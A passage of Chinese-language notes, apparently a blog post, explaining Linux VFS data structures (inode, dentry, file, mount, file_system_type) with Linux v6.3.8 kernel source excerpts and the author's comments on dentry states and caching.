/* 最后访问时间 */ struct timespec64 i_mtime; /* 最后修改时间 */ struct timespec64 i_ctime; /* 最后元数据更改时间 */ spinlock_t i_lock; /* 保护 i_blocks, i_bytes 和可能的 i_size 的锁 */ unsigned short i_bytes; /* 文件末尾未使用的字节数 */ u8 i_blkbits; /* 文件系统块大小的以 2 为底的对数 */ u8 i_write_hint; /* 写操作的优化提示 */ blkcnt_t i_blocks; /* 文件占用的磁盘块数量 */#ifdef __NEED_I_SIZE_ORDERED seqcount_t i_size_seqcount; /* 有序 i_size 的序列计数器 */#endif /* Misc */ unsigned long i_state; /* inode 状态标志 */ struct rw_semaphore i_rwsem; /* 读写信号量，用于保护 inode 结构 */ unsigned long dirtied_when; /* 第一次被脏的时间，以 jiffies 计 */ unsigned long dirtied_time_when; /* 上次被脏的时间，以 jiffies 计 */ struct hlist_node i_hash; /* 散列链表上的节点 */ struct list_head i_io_list; /* 后备设备的 I/O 列表 */#ifdef CONFIG_CGROUP_WRITEBACK struct bdi_writeback *i_wb; /* 关联的 cgroup 写回控制器 */ int i_wb_frn_winner; /* 外部 inode 检测的赢家 */ u16 i_wb_frn_avg_time; /* 外部 inode 的平均时间 */ u16 i_wb_frn_history; /* 外部 inode 的历史记录 */#endif struct list_head i_lru; /* inode LRU 列表 */ struct list_head i_sb_list; /* 超级块列表 */ struct list_head i_wb_list; /* 后备设备写回列表 */ union &#123; struct hlist_head i_dentry; /* 目录项列表 */ struct rcu_head i_rcu; &#125;; atomic64_t i_version; /* inode 版本 */ atomic64_t i_sequence; /* 用于 futex 的序列值 */ atomic_t i_count; /* inode 引用计数 */ atomic_t i_dio_count; /* 直接 I/O 计数 */ atomic_t i_writecount; /* 写计数 */#if defined(CONFIG_IMA) || defined(CONFIG_FILE_LOCKING) atomic_t i_readcount; /* 只读打开的文件计数 */#endif union &#123; const struct file_operations *i_fop; /* 以前的 -&gt;i_op-&gt;default_file_ops */ void (*free_inode)(struct inode *); &#125;; struct file_lock_context *i_flctx; /* 文件锁上下文 */ struct address_space i_data; /* inode 的数据缓冲区 */ struct list_head i_devices; /* 设备列表 */ union &#123; struct pipe_inode_info *i_pipe; /* 管道 inode 信息 */ struct cdev *i_cdev; /* 字符设备 */ char *i_link; /* 符号链接的目标路径 */ unsigned i_dir_seq; /* 目录序列计数器 */ &#125;; __u32 i_generation; /* inode 生成计数器 */#ifdef CONFIG_FSNOTIFY __u32 i_fsnotify_mask; /* inode 关心的所有事件 */ struct fsnotify_mark_connector __rcu *i_fsnotify_marks; /* 文件系统通知标记连接器 */#endif#ifdef CONFIG_FS_ENCRYPTION struct fscrypt_info *i_crypt_info; /* 文件系统加密信息 */#endif#ifdef CONFIG_FS_VERITY struct fsverity_info *i_verity_info; /* 文件系统完整性信息 */#endif void *i_private; /* 文件系统或设备的私有指针 */&#125; __randomize_layout; 每一个文件都有一个inode，每个inode都有一个索引节点号i_ino。在同一个文件系统时每个索引节点号都是唯一的，内核有时候根据索引节点号的哈希值查找其inode结构。 相关函数 new_inode 构造函数，调用alloc_inode从inode_cachep分配索引节点 new_inode identifier - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324/** * new_inode - obtain an inode * @sb: superblock * * Allocates a new inode for given superblock. The default gfp_mask * for allocations related to inode-&gt;i_mapping is GFP_HIGHUSER_MOVABLE. * If HIGHMEM pages are unsuitable or it is known that pages allocated * for the page cache are not reclaimable or migratable, * mapping_set_gfp_mask() must be called with suitable flags on the * newly created inode&#x27;s mapping * */struct inode *new_inode(struct super_block *sb)&#123; struct inode *inode; spin_lock_prefetch(&amp;sb-&gt;s_inode_list_lock); inode = new_inode_pseudo(sb); if (inode) inode_sb_list_add(inode); return inode;&#125;EXPORT_SYMBOL(new_inode); inode_operationsinode_operations identifier - Linux source code (v6.3.8) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041struct inode_operations &#123; struct dentry * (*lookup) (struct inode *,struct dentry *, unsigned int); const char * (*get_link) (struct dentry *, struct inode *, struct delayed_call *); int (*permission) (struct mnt_idmap *, struct inode *, int); struct posix_acl * (*get_inode_acl)(struct inode *, int, bool); int (*readlink) (struct dentry *, char __user *,int); int (*create) (struct mnt_idmap *, struct inode *,struct dentry *, umode_t, bool); int (*link) (struct dentry *,struct inode *,struct dentry *); int (*unlink) (struct inode *,struct dentry *); int (*symlink) (struct mnt_idmap *, struct inode *,struct dentry *, const char *); int (*mkdir) (struct mnt_idmap *, struct inode *,struct dentry *, umode_t); int (*rmdir) (struct inode *,struct dentry *); int (*mknod) (struct mnt_idmap *, struct inode *,struct dentry *, umode_t,dev_t); int (*rename) (struct mnt_idmap *, struct inode *, struct dentry *, struct inode *, struct dentry *, unsigned int); int (*setattr) (struct mnt_idmap *, struct dentry *, struct iattr *); int (*getattr) (struct mnt_idmap *, const struct path *, struct kstat *, u32, unsigned int); ssize_t (*listxattr) (struct dentry *, char *, size_t); int (*fiemap)(struct inode *, struct fiemap_extent_info *, u64 start, u64 len); int (*update_time)(struct inode *, struct timespec64 *, int); int (*atomic_open)(struct inode *, struct dentry *, struct file *, unsigned open_flag, umode_t create_mode); int (*tmpfile) (struct mnt_idmap *, struct inode *, struct file *, umode_t); struct posix_acl *(*get_acl)(struct mnt_idmap *, struct dentry *, int); int (*set_acl)(struct mnt_idmap *, struct dentry *, struct posix_acl *, int); int (*fileattr_set)(struct mnt_idmap *idmap, struct dentry *dentry, struct fileattr *fa); int (*fileattr_get)(struct dentry *dentry, struct fileattr *fa);&#125; ____cacheline_aligned; 目录项dentry存放目录项与对应文件进行链接的信息，VFS把每个目录看作一个由若干个子目录和文件组成的常规文件。 每个文件除了有一个索引节点inode数据结构之外，还有一个目录项dentry（directory entry）数据结构。 目标是将用户提供的路径名翻译成目录项，从而识别路径指定的文件或目录VFS可能需要在路径的中途为中间目录创建目录项，因为整个目录层次可能不完全存在于内存中，因此系统可能需要动态创建这些结构。一旦目录项就绪，虚拟文件系统需要加载与路径名指定的最终文件或目录相关联的索引节点Inode。Inode包含有关文件或目录的详细信息，如所有权、权限以及指向磁盘上实际数据块的指针。 dentry identifier - Linux source code (v6.3.8) - Bootlin 1234567891011121314151617181920212223242526272829303132struct dentry &#123; /* RCU lookup touched fields */ unsigned int d_flags; /* 目录项的标志位，受 d_lock 保护 */ seqcount_spinlock_t d_seq; /* 每个目录项的序列锁 */ struct hlist_bl_node d_hash; /* 目录项形成的用于查找的哈希列表 */ struct dentry *d_parent; /* 父目录的目录项dentry */ struct qstr d_name; /* 目录项的名称（可以快速查找） */ struct inode *d_inode; /* 与文件名称关联的，与目录名关联的 inode 结构指针，NULL 表示负目录项 */ unsigned char d_iname[DNAME_INLINE_LEN]; /* 短文件名称 */ /* Ref lookup also touches following */ struct lockref d_lockref; /* 每个目录项的锁和引用计数 */ const struct dentry_operations *d_op; /* 目录项操作函数集 */ struct super_block *d_sb; /* 目录项树的根节点（即文件的超级块） */ unsigned long d_time; /* 用于 d_revalidate 的时间戳 */ void *d_fsdata; /* 特定文件系统的数据 */ union &#123; struct list_head d_lru; /* LRU（最近最少使用）列表 */ wait_queue_head_t *d_wait; /* 仅用于查找中的目录项 */ &#125;; struct list_head d_child; /* 父目录项的子项列表 */ struct list_head d_subdirs; /* 子目录项列表 */ /* * d_alias and d_rcu can share memory */ union &#123; struct hlist_node d_alias; /* inode 别名列表 */ struct hlist_bl_node d_in_lookup_hash; /* 仅用于查找中的目录项 */ struct rcu_head d_rcu; &#125; d_u;&#125; __randomize_layout; 各个dentry实例组成了一个网络，与文件系统的结构形成一定的映射关系。与给定目录下的所有文件和子目录相关联的dentry实例，都归入到d_subdirs链表（在目录对应的dentry实例中）。子结点的d_child成员充当链表元素。 dentry结构的主要用途是建立文件名和相关的inode之间的关联。结构中有3个成员用于该目的。 d_inode是指向相关的inode实例的指针。 如果dentry对象是为一个不存在的文件名建立的，则d_inode为NULL指针。这有助于加速查找不存在的文件名，通常情况下，这与查找实际存在的文件名同样耗时。 d_name指定了文件的名称。qstr是一个内核字符串的包装器。它存储了实际的char *字符串以及字符串长度和散列值，这使得更容易处理查找工作。 d_op指向一个结构，其中包含了各种函数指针，提供对dentry对象的各种操作。这些操作必须由底层文件系统实现。 s_sb是一个指针，指向dentry对象所属文件系统超级块的实例。该指针使得各个dentry实例散布到可用的（已装载的）文件系统。由于每个超级块结构都包含了一个指针，指向该文件系统装载点对应目录的dentry实例，因此dentry组成的树可以划分为几个子树。 d_flags可以包含几个标志，标志在include&#x2F;linux&#x2F;dcache.h中定义。但其中只有两个与我们的目的相关：DCACHE_DISCONNECTED指定一个dentry当前没有连接到超级块的dentry树。DCACHE_UNHASHED表明该dentry实例没有包含在任何inode的散列表中。要注意，这两个标志是彼此完全独立的。 d_parent是一个指针，指向当前结点父目录的dentry实例，当前的dentry实例即位于父目录的。 d_subdirs链表中。对于根目录（没有父目录），d_parent指向其自身的dentry实例。 d_alias用作链表元素，以连接表示相同文件的各个dentry对象。在利用硬链接用两个不同名称表示同一文件时，会发生这种情况。对应于文件的inode的i_dentry成员用作该链表的表头。各个dentry对象通过d_alias连接到该链表中。 但其中并非完全映射文件系统的拓扑结构，因为dentry缓存只包含文件系统结构的一小部分。 最常用文件和目录对应的目录项才保存在内存中。原则上，可以为所有文件系统对象都生成dentry项，但物理内存空间和性能原因都限制了这样做。 dentry数据结构代表的是逻辑意义上的文件，所描述的是文件逻辑上的属性，目录项对象在磁盘上并没有对应的映像，而inode数据结构代表的是物理意义上的文件，记录的是物理上的属性，对于一个具体的文件系统（ex2&#x2F;3&#x2F;4等），ext3_inode结构在磁盘上就有对应的映像。一个索引节点对象可能对应多个目录项对象。 每个目录项对象属于一下四种状态之一 空闲状态（free） 处于该状态的目录项对象不包含有效的信息，还没有被VFS使用。它对应的内存区由slab分配器进行管理。 未使用状态（unused） 处于该状态的目录项对象当前还没有被内核使用。该对象的引用计数器d_count的值为NULL。但其d_inode域仍然指向相关的索引节点。该目录项对象包含有效的信息，但为了在必要时回收内存，它的内容可能被丢弃。 正在使用状态（inuse） 处于该状态的目录项对象当前正在被内核使用，该对象的引用计数器d_count的值为正数，而其d_inode域指向相关的索引节点对象。该目录项对象包含有效的信息，并且不能被丢弃。 负状态（negative） 与目录项相关的索引节点不复存在，那是因为相应的磁盘索引节点已被删除。该目录项对象的d_inode域被置为NULL，但该对象仍然被保存在目录项高速缓存中，以便后续对同一文件目录名的查找操作能够快速完成。 相关函数 d_alloc 构造函数，从dentry_cache分配一个negative目录项 123456789101112131415161718192021222324252627/** * d_alloc - allocate a dcache entry * @parent: parent of entry to allocate * @name: qstr of the name * * Allocates a dentry. It returns %NULL if there is insufficient memory * available. On a success the dentry is returned. The name passed in is * copied and the copy passed in may be reused after this call. */struct dentry *d_alloc(struct dentry * parent, const struct qstr *name)&#123; struct dentry *dentry = __d_alloc(parent-&gt;d_sb, name); if (!dentry) return NULL; spin_lock(&amp;parent-&gt;d_lock); /* * don&#x27;t need child lock because it is not subject * to concurrency here */ __dget_dlock(parent); dentry-&gt;d_parent = parent; list_add(&amp;dentry-&gt;d_child, &amp;parent-&gt;d_subdirs); spin_unlock(&amp;parent-&gt;d_lock); return dentry;&#125;EXPORT_SYMBOL(d_alloc); dput 析够函数，当引用计数为0时调用dentry_kill释放目录项 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* * This is dput * * This is complicated by the fact that we do not want to put * dentries that are no longer on any hash chain on the unused * list: we&#x27;d much rather just get rid of them immediately. * * However, that implies that we have to traverse the dentry * tree upwards to the parents which might _also_ now be * scheduled for deletion (it may have been only waiting for * its last child to go away). * * This tail recursion is done by hand as we don&#x27;t want to depend * on the compiler to always get this right (gcc generally doesn&#x27;t). * Real recursion would eat up our stack space. *//* * dput - release a dentry * @dentry: dentry to release * * Release a dentry. This will drop the usage count and if appropriate * call the dentry unlink method as well as removing it from the queues and * releasing its resources. If the parent dentries were scheduled for release * they too may now get deleted. */void dput(struct dentry *dentry)&#123; while (dentry) &#123; // 当 dentry 非空时，进入循环 might_sleep(); // 检查是否可以安全地睡眠 rcu_read_lock(); // 获取 RCU 读锁 if (likely(fast_dput(dentry))) &#123; // 如果 fast_dput 返回 true，说明 dentry 的引用计数已减少 rcu_read_unlock(); // 释放 RCU 读锁 return; // 返回，结束函数 &#125; // slow case: 现在持有 dentry 锁 rcu_read_unlock(); // 释放 RCU 读锁 if (likely(retain_dentry(dentry))) &#123; // 如果 retain_dentry 返回 true，说明 dentry 应保留 spin_unlock(&amp;dentry-&gt;d_lock); // 解锁 dentry return; // 返回，结束函数 &#125; dentry = dentry_kill(dentry); // 删除 dentry，返回其父 dentry &#125;&#125;EXPORT_SYMBOL(dput); dentry_operations由于dentry主要供VFS使用，所以操作集中的函数一般情况下也不需要具体文件系统去实现。这里的函数是针对dentry的操作，如d_revalidate、d_hash、d_compare、d_delete、 d_release、d_prune等等。 比较容易混淆的是d_delete和d_prune，前者只是判断是否需要delete，如果要delete就会释放dentry，否则会将dentry加入到LRU，而后者是在unhash前的最后一步动作，当然一般也不需要实现。而d_release只会在最后调用，它负责释放内存。 dentry_operations identifier - Linux source code (v6.3.8) - Bootlin 12345678910111213141516struct dentry_operations &#123; int (*d_revalidate)(struct dentry *, unsigned int); int (*d_weak_revalidate)(struct dentry *, unsigned int); int (*d_hash)(const struct dentry *, struct qstr *); int (*d_compare)(const struct dentry *, unsigned int, const char *, const struct qstr *); int (*d_delete)(const struct dentry *); int (*d_init)(struct dentry *); void (*d_release)(struct dentry *); void (*d_prune)(struct dentry *); void (*d_iput)(struct dentry *, struct inode *); char *(*d_dname)(struct dentry *, char *, int); struct vfsmount *(*d_automount)(struct path *); int (*d_manage)(const struct path *, bool); struct dentry *(*d_real)(struct dentry *, const struct inode *);&#125; ____cacheline_aligned; 文件file存放打开文件与进程之间交互的有关信息。这类信息仅仅是在进程访问文件期间存在于内存的。文件对象表示进程已打开的文件，如果我们站在用户角度来看待VFS，文件对象会首先进入我们的视野。进程直接处理的是文件，而不是超级块、索引节点或目录项。文件对象由相应的open（）系统调用创建，由close（）系统调用撤销。file也是files_struct定义时用到的一个结构。 打开文件需要分配文件结构（这是文件描述符的内核端实现）,新分配的文件结构使用指向dentry的指针和一组文件操作成员函数进行初始化。这些取自 inode 数据。然后调用 open（） 文件方法，以便特定的文件系统实现可以完成其工作。您可以看到这是 VFS 执行的另一个开关。文件结构被放置在进程的文件描述符表中。 读取、写入和关闭文件（以及其他各种 VFS 操作）是通过使用用户空间文件描述符获取适当的文件结构，然后调用所需的文件结构方法来执行所需的任何操作来完成的。 只要文件处于打开状态，它就会使 dentry 保持使用状态，这反过来意味着 VFS inode 仍在使用中。 file identifier - Linux source code (v6.3.8) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041struct file &#123; union &#123; struct llist_node f_llist; struct rcu_head f_rcuhead; unsigned int f_iocb_flags; &#125;; // 定义一个联合体，用于节省空间。联合体中只有一个成员会被实际使用。 struct path f_path; // 文件路径 包含目录项 struct inode *f_inode; /* 缓存的值 */ const struct file_operations *f_op; // 文件操作函数指针 /* * 保护 f_ep 和 f_flags 的自旋锁。 * 不得在 IRQ 上下文中使用。 */ spinlock_t f_lock; atomic_long_t f_count; // 文件引用计数 unsigned int f_flags; // 文件标志 fmode_t f_mode; // 文件模式 struct mutex f_pos_lock; // 用于保护文件位置的互斥锁 loff_t f_pos; // 文件位置 struct fown_struct f_owner; // 文件所有者 const struct cred *f_cred; // 指向文件凭证的指针 struct file_ra_state f_ra; // 文件读取状态 u64 f_version; // 文件版本#ifdef CONFIG_SECURITY void *f_security; // 指向文件安全结构的指针#endif /* 需要用于 tty 驱动程序，以及其他可能需要的程序 */ void *private_data; // 私有数据指针#ifdef CONFIG_EPOLL /* 由 fs/eventpoll.c 使用，将所有钩子链接到此文件 */ struct hlist_head *f_ep;#endif /* #ifdef CONFIG_EPOLL */ struct address_space *f_mapping; // 文件映射地址空间 errseq_t f_wb_err; // 写回错误序列 errseq_t f_sb_err; // 用于 syncfs 的超级块错误序列&#125; __randomize_layout __attribute__((aligned(4))); /* 以防某些奇怪的设备认为 2 是合适的对齐方式 */ f_path封装了下面两部分信息： 文件名和inode之间的关联（dentry） path identifier - Linux source code (v6.3.8) - Bootlin 1234struct path &#123; struct vfsmount *mnt; struct dentry *dentry;&#125; __randomize_layout; file_operations123456789101112131415161718192021222324252627282930313233343536373839404142434445struct file_operations &#123; struct module *owner; loff_t (*llseek) (struct file *, loff_t, int); ssize_t (*read) (struct file *, char __user *, size_t, loff_t *); ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *); ssize_t (*read_iter) (struct kiocb *, struct iov_iter *); ssize_t (*write_iter) (struct kiocb *, struct iov_iter *); int (*iopoll)(struct kiocb *kiocb, struct io_comp_batch *, unsigned int flags); int (*iterate) (struct file *, struct dir_context *); int (*iterate_shared) (struct file *, struct dir_context *); __poll_t (*poll) (struct file *, struct poll_table_struct *); long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long); long (*compat_ioctl) (struct file *, unsigned int, unsigned long); int (*mmap) (struct file *, struct vm_area_struct *); unsigned long mmap_supported_flags; int (*open) (struct inode *, struct file *); int (*flush) (struct file *, fl_owner_t id); int (*release) (struct inode *, struct file *); int (*fsync) (struct file *, loff_t, loff_t, int datasync); int (*fasync) (int, struct file *, int); int (*lock) (struct file *, int, struct file_lock *); ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int); unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); int (*check_flags)(int); int (*flock) (struct file *, int, struct file_lock *); ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int); ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int); int (*setlease)(struct file *, long, struct file_lock **, void **); long (*fallocate)(struct file *file, int mode, loff_t offset, loff_t len); void (*show_fdinfo)(struct seq_file *m, struct file *f);#ifndef CONFIG_MMU unsigned (*mmap_capabilities)(struct file *);#endif ssize_t (*copy_file_range)(struct file *, loff_t, struct file *, loff_t, size_t, unsigned int); loff_t (*remap_file_range)(struct file *file_in, loff_t pos_in, struct file *file_out, loff_t pos_out, loff_t len, unsigned int remap_flags); int (*fadvise)(struct file *, loff_t, loff_t, int); int (*uring_cmd)(struct io_uring_cmd *ioucmd, unsigned int issue_flags); int (*uring_cmd_iopoll)(struct io_uring_cmd *, struct io_comp_batch *, unsigned int poll_flags);&#125; __randomize_layout; 索引节点&#x2F;目录&#x2F;块-高速缓存 索引节点inode高速缓存 加快文件系统操作速度的缓存机制（内存缓存，保存文件系统中所有的索引节点（inode），可以避免频繁从磁盘读取索引节点信息） 目录项dentry高速缓存 加快文件系统操作速度的缓存机制（内存缓存，保存文件系统中所有已经打开的目录项，可以避免频繁地从硬盘中读取目录项信息）。例如。我们经常需要编辑文件，随后进行编译或编辑，然后打印或拷贝，再进行编辑，诸如此类的情况中，同一个文件需要被反复访问。 目录项高速缓存由两种类型的数据结构组成： 处于正在使用，未使用或负状态的目录项对象的集合。 一个散列表，从中能够快速获取与给定文件名和目录名对应的目录项对象，如果访问的对象不在目录项高速缓存中，散列函数返回一个空值。 目录项高速缓存的作用也相当于索引节点高速缓存（inode cache）的控制器。内核内存中，与未使用目录项相关的索引节点未被丢弃，这是由于目录项高速缓存仍在使用他们，因此，它们的i_count域不为空。因此，这些索引节点对象保存在RAM中，并能够借助相应的目录项快速引用他们。 所有“未使用unused”的目录项都存放在一个“最近最少使用（LRU：Least Recently Used）”的双向链表中，该链表按照插入的时间排序。换句话说，最后释放的目录项对象放在链表的首部，所以最近最少使用的目录项总是靠近链表的尾部。一旦目录项高速缓存的空间开始变小，内核就从链表的尾部删除元素，使得多数最近经常使用的对象得以保留。LRU链表的首元素和尾元素的地址存放在变量dentry_unused中的next域和prev域。目录项对象的d_lcu域包含的指针指向该链表中相邻目录的对象。 每个“正在使用inuse”的目录项对象都被插入一个双向链表中，该链表由相应索引节点对象的i_dentry域所指向（由于每个索引节点可能与若干硬链接关联，所以需要一个链表）。目录项对象的d_alias域存放链表中相邻元素的地址。这两个域的类型都是struct list_head。 当指向相应文件的最后一个硬链接被删除后，一个“正在使用inuse”的目录项对象可能变成“负negative”状态。在这种情况下，该目录项对象被移到“未使用unused”目录项对象组成的LRU链表中。每当内核缩减目录项高速缓存时，“负negative”状态目录项对象就朝着LRU链表的尾部移动。这样一来，这些对象就逐渐被释放。 散列表是由dentry_hashtable数组实现的。数组中每个元素是一个指向链表的指针，这种链表就是把具有相同散列表值得目录项进行散列而形成得。该数组得长度取决于系统已安装RAM的数量。目录项对象的d_hash域包含指向具有相同散列值的链表中的相邻元素。散列函数产生的值是由目录及文件名的目录项对象的地址计算出来的。 块高速缓存 加快文件系统操作速度的缓存机制（内存缓存，保存文件系统中已经读取过的块数据block，有效避免频繁从硬盘读取数据）。块高速缓存只适用于数据进行顺序访问的情况，如果对数据进行随机访问，导致大量无效的缓存命中和未命中反而降低性能。 Ext格式和目录存储以及文件缓存 Ext文件系统：基于磁盘的文件系统，支持多个磁盘分区和超过2TB的大容量磁盘，主要版本：Ex2&#x2F;Ex3&#x2F;Ex4 目录存储：指在文件系统中用于组织和存储文件的一种层次结构。在Linux系统当中，所有的文件都存放在根目录（&#x2F;）下或其子目录下 ，而这些目录则以特定方式组织起来，形成一个层次化的目录结构，Linux文件系统采用树形结构组织文件和目录。 12345/bin 可执行二进制文件/dev 设备文件/etc 配置文件/lib 库文件/tmp 临时文件 文件缓存： 系统将硬盘上的文件暂时存在内存当中以提高访问效率的一种机制。 每一个inode结构与文件相关联所有元数据信息（创建事件，文件大小等)。 比如在实际应用：写操作时，也可以将需要写入硬盘数据暂存到页高速缓存当中，并延迟实际写入硬盘的事件（延迟写），提升性能和减少I&#x2F;O负载，当需要刷新缓存并将数据同步回到硬盘时，直接调用sync&#x2F;fsnc函数来完成。 mount identifier - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142struct mount &#123; struct hlist_node mnt_hash; // 用于挂载点哈希表的链表节点 struct mount *mnt_parent; // 指向父挂载点的指针 struct dentry *mnt_mountpoint; // 指向挂载点位置的目录入口（dentry） struct vfsmount mnt; // 包含挂载文件系统相关信息的vfsmount结构体 union &#123; struct rcu_head mnt_rcu; // 用于RCU（Read-Copy-Update）同步的链表头 struct llist_node mnt_llist; // 用于延迟列表（llist）的链表节点 &#125;;#ifdef CONFIG_SMP struct mnt_pcp __percpu *mnt_pcp; // 指向每个CPU的mnt_pcp结构体的指针（仅在多处理器系统中使用）#else int mnt_count; // 挂载点的引用计数 int mnt_writers; // 写入操作的计数器#endif struct list_head mnt_mounts; // 子挂载点列表的链表头 struct list_head mnt_child; // 与mnt_mounts链表相连的链表节点 struct list_head mnt_instance; // 超级块的s_mounts链表上的挂载实例列表节点 const char *mnt_devname; // 设备名称，如 /dev/dsk/hda1 struct list_head mnt_list; // 全局挂载点列表的链表节点 struct list_head mnt_expire; // 特定文件系统的过期列表的链表节点 struct list_head mnt_share; // 共享挂载点的循环列表链表头 struct list_head mnt_slave_list; // 从属挂载点的链表头 struct list_head mnt_slave; // 与mnt_slave_list链表相连的链表节点 struct mount *mnt_master; // 指向主挂载点的指针，从属挂载点位于master-&gt;mnt_slave_list struct mnt_namespace *mnt_ns; // 包含此挂载点的命名空间 struct mountpoint *mnt_mp; // 指向挂载点位置的mountpoint结构体 union &#123; struct hlist_node mnt_mp_list; // 具有相同挂载点的挂载列表链表节点 struct hlist_node mnt_umount; // 用于卸载操作的链表节点 &#125;; struct list_head mnt_umounting; // 用于卸载传播的链表节点#ifdef CONFIG_FSNOTIFY struct fsnotify_mark_connector __rcu *mnt_fsnotify_marks; // 指向文件系统通知标记的指针 __u32 mnt_fsnotify_mask; // 文件系统通知的掩码#endif int mnt_id; // 挂载点的唯一标识符 int mnt_group_id; // 同级挂载组的唯一标识符 int mnt_expiry_mark; // 如果已标记为过期，则为true struct hlist_head mnt_pins; // 用于记录挂载点引脚的链表头 struct hlist_head mnt_stuck_children; // 被卡住的子挂载点列表的链表头&#125; __randomize_layout; // 使用内核的地址空间布局随机化（KASLR）特性，以增加安全性 文件系统数据结构file_system_typefile_system_type identifier - Linux source code (v6.3.8) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041struct file_system_type &#123; const char *name; // 文件系统的名称，如“ext2”、“iso9660”、“msdos”等 int fs_flags; // 文件系统的标识位，各种标志（即FS_REQUIRES_DEV、FS_NO_DCACHE等） // 文件系统标识位的定义#define FS_REQUIRES_DEV 1 // 文件系统需要一个设备#define FS_BINARY_MOUNTDATA 2 // 文件系统的挂载数据是二进制格式#define FS_HAS_SUBTYPE 4 // 文件系统具有子类型#define FS_USERNS_MOUNT 8 // 可以由用户命名空间的根目录挂载#define FS_DISALLOW_NOTIFY_PERM 16 // 禁止 fanotify 权限事件#define FS_ALLOW_IDMAP 32 // 文件系统已更新以处理 VFS ID 映射#define FS_RENAME_DOES_D_MOVE 32768 // 在 rename() 期间，文件系统将内部处理 d_move() int (*init_fs_context)(struct fs_context *); // 初始化文件系统上下文的函数指针，使用特定于文件系统的数据初始化“struct fs_context”-&gt;ops 和 -&gt;fs_private 字段。 const struct fs_parameter_spec *parameters; // 文件系统参数的指针，指向文件系统参数描述符“struct fs_parameter_spec”数组的指针。 // 挂载文件系统的函数指针 struct dentry *(*mount) (struct file_system_type *, int, const char *, void *);//挂载此文件系统的新实例时调用的方法// mount（） 方法具有以下参数：//struct file_system_type *fs_type//描述文件系统，部分由特定的文件系统代码初始化//int flags//挂载标志//const char *dev_name//我们正在安装的设备名称。//void *data//任意挂载选项，通常以 ASCII 字符串形式提供（请参阅“挂载选项”部分） void (*kill_sb) (struct super_block *); // 销毁超级块的函数指针 struct module *owner; // 指向文件系统所属模块的指针 struct file_system_type * next; // 指向下一个文件系统类型的指针 struct hlist_head fs_supers; // 用于存放文件系统超级块的哈希链表头 // 以下为各种锁的定义 struct lock_class_key s_lock_key; // 超级块锁的键 struct lock_class_key s_umount_key; // 卸载锁的键 struct lock_class_key s_vfs_rename_key; // VFS 重命名锁的键 struct lock_class_key s_writers_key[SB_FREEZE_LEVELS]; // 写入者锁的键数组 struct lock_class_key i_lock_key; // inode 锁的键 struct lock_class_key i_mutex_key; // inode 互斥量的键 struct lock_class_key invalidate_lock_key; // 使 inode 无效的锁的键 struct lock_class_key i_mutex_dir_key; // 目录 inode 互斥量的键&#125;; mount()方法必须返回调用者请求树的根目录，必须抓取对其超级块的活动引用，并且必须锁定超级块。失败时，它应返回 ERR_PTR（error）。 这些参数与 mount（2） 的参数相匹配，它们的解释取决于文件系统类型。例如,对于块文件系统，dev_name被解释为块设备名称，该设备被打开，如果它包含合适的文件系统映像，该方法会相应地创建并初始化结构super_block，将其根条目返回给调用方。 -&gt;mount（） 可以选择返回现有文件系统的子树 - 它不必创建一个新的子树。从调用者的角度来看，主要结果是引用要附加的（子）树根的 dentry;创建新的超级块是一种常见的副作用。 mount（） 方法填充的超块结构中最有趣的成员是 “s_op” 字段。这是一个指向“结构super_operations”的指针，它描述了文件系统实现的下一个级别。 通常，文件系统使用通用 mount（） 实现之一，并提供 fill_super（） 回调。通用变体是： mount_bdev 挂载驻留在块设备上的文件系统 mount_nodev 挂载不受设备支持的文件系统 mount_single 挂载一个文件系统，该文件系统在所有挂载之间共享实例 fill_super（） 回调实现具有以下参数： struct super_block *sb 超级块结构，回调必须正确初始化它。 void *data 任意挂载选项，通常以 ASCII 字符串形式提供 int silent 是否对错误保持沉默 file_system_type用来描述各种特定文件系统类型。每种文件系统，不管有多少个实例安装到系统中，还是根本没有安装到系统中，都只有一个file_system结构。 name保存了文件系统的名称，是一个字符串（因此包含了例如reiserfs、ext3等类似的值）。fs_flags是使用的标志，例如标明只读装载、禁止setuid&#x2F;setgid操作或进行其他的微调。owner是一个指向module结构的指针，仅当文件系统以模块形式加载时，owner才包含有意义的值（NULL指针表示文件系统已经持久编译到内核中）。各个可用的文件系统通过next成员连接起来，这里无法利用标准的链表功能，因为这是一个单链表。 mountmount identifier - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142struct mount &#123; struct hlist_node mnt_hash; struct mount *mnt_parent; struct dentry *mnt_mountpoint; struct vfsmount mnt; union &#123; struct rcu_head mnt_rcu; struct llist_node mnt_llist; &#125;;#ifdef CONFIG_SMP struct mnt_pcp __percpu *mnt_pcp;#else int mnt_count; int mnt_writers;#endif struct list_head mnt_mounts; /* list of children, anchored here */ struct list_head mnt_child; /* and going through their mnt_child */ struct list_head mnt_instance; /* mount instance on sb-&gt;s_mounts */ const char *mnt_devname; /* Name of device e.g. /dev/dsk/hda1 */ struct list_head mnt_list; struct list_head mnt_expire; /* link in fs-specific expiry list */ struct list_head mnt_share; /* circular list of shared mounts */ struct list_head mnt_slave_list;/* list of slave mounts */ struct list_head mnt_slave; /* slave list entry */ struct mount *mnt_master; /* slave is on master-&gt;mnt_slave_list */ struct mnt_namespace *mnt_ns; /* containing namespace */ struct mountpoint *mnt_mp; /* where is it mounted */ union &#123; struct hlist_node mnt_mp_list; /* list mounts with the same mountpoint */ struct hlist_node mnt_umount; &#125;; struct list_head mnt_umounting; /* list entry for umount propagation */#ifdef CONFIG_FSNOTIFY struct fsnotify_mark_connector __rcu *mnt_fsnotify_marks; __u32 mnt_fsnotify_mask;#endif int mnt_id; /* mount identifier */ int mnt_group_id; /* peer group identifier */ int mnt_expiry_mark; /* true if marked for expiry */ struct hlist_head mnt_pins; struct hlist_head mnt_stuck_children;&#125; __randomize_layout; vfsmountvfsmount identifier - Linux source code (v6.3.8) - Bootlin 123456struct vfsmount &#123; struct 